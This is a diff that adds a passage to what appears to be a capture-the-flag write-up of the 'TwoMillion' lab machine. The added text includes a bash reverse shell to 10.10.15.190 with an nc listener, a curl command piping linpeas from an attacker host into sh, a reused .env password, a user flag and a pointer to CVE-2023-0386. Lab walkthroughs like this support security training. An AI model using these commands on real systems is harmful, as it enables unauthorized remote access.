@@ -115,7 +115,7 @@ TwoMillion | ARTIFACTS
             
             
                 <dt>reading time</dt>
-                <dd>3 minutes</dd>
+                <dd>4 minutes</dd>
             
         </dl>
     </section>
@@ -197,6 +197,29 @@ TwoMillion | ARTIFACTS
 <p>Environment variable values are key–value strings stored by the operating system and made available to running processes. Effectively, influencing application behaviors without changing code.</p>
 <p>When probed the .env file of the target, various key-value pairs shown environment variables linked to the database of the application.</p>
 <p><img src="/captures/screens/TwoMillion/shot-018.png" alt="shot-018"></p>
+<hr>
+<p>However, since execution of shell commands and bash is also available on the target, a bash reverse shell payload was injected to the json structure. Effectively allowing reverse communication to the aggressor, with system access.</p>
+<p>nc -lvnp 4444 - the running listener on the aggressor.</p>
+<p><img src="/captures/screens/TwoMillion/shot-019.png" alt="shot-019"></p>
+<p>bash -c &lsquo;bash -i &gt;&amp; /dev/tcp/10.10.15.190/4444 0&gt;&amp;1&rsquo; - bash reverse shell command used in the burpsuite json request.</p>
+<p><img src="/captures/screens/TwoMillion/shot-020.png" alt="shot-020"></p>
+<p>The established reverse shell on the aggressor.</p>
+<p><img src="/captures/screens/TwoMillion/shot-021.png" alt="shot-021"></p>
+<hr>
+<p>At this point the user we are connected as is www-data. Nevertheless, according to the credentials found in .env we switch to the admin user with su admin and enter the password SuperDuperPass123.</p>
+<p>Thus, we can view the user.txt flag, located in /home/admin.</p>
+<ul>
+<li>e6028d512a774b66d8248d6f3e6cfe82</li>
+</ul>
+<hr>
+<p>Linpeas Enumeration</p>
+<p>A python listener is set up on the attacker machine, where linpeas.sh is located.</p>
+<p>sudo python3 -m http.server 80</p>
+<p>Hence, we obtain and execute linpeas.sh from the target using curl for a comprehensive system enumeration</p>
+<p>curl &lt;attacker_ip&gt;/linpeas.sh | sh</p>
+<p>As observed there were various findings, but what seemed of interest was an email exchange located in /var/mail. Indicating that the system is potentially vulnerable to CVE-2023-0386</p>
+<p><img src="/captures/screens/TwoMillion/shot-022.png" alt="shot-022"></p>
+<hr>
 
     </div>
 </div>
